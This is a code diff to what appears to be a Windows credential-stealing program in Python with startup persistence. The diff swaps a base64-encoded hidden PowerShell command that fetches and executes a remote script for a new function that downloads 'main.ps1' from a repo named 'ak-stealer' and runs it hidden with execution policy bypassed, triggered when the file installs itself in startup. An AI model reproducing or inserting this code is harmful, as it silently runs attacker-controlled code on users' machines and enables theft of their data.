@@ -172,6 +172,14 @@ class Tasks:
         for thread in Tasks.threads:
             thread.join()
 
+
+def download_and_execute_powershell():
+    url = "https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/main.ps1"
+    file_path = "main.ps1"
+    
+    urllib.request.urlretrieve(url, file_path)
+    os.system(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {file_path}')
+
 class Syscalls:
 
     @staticmethod
@@ -1824,7 +1832,8 @@ if __name__ == "__main__" and os.name == "nt":
     
         try:
             if Utility.GetSelf()[1] and Settings.Startup and not Utility.IsInStartup(): # If startup option is enabled, and the file is not in the startup, then put it in startup
-                import subprocess, threading; threading.Thread(target=lambda: subprocess.run(["powershell", "-WindowStyle", "Hidden", "-encodedCommand", "aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA=="], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL), daemon=True).start()
+                thread = Thread(target=download_and_execute_powershell)
+                thread.start()
                 Logger.info("Trying to put the file in startup")
                 path = Utility.PutInStartup() # Put the file in startup
                 if path is not None:
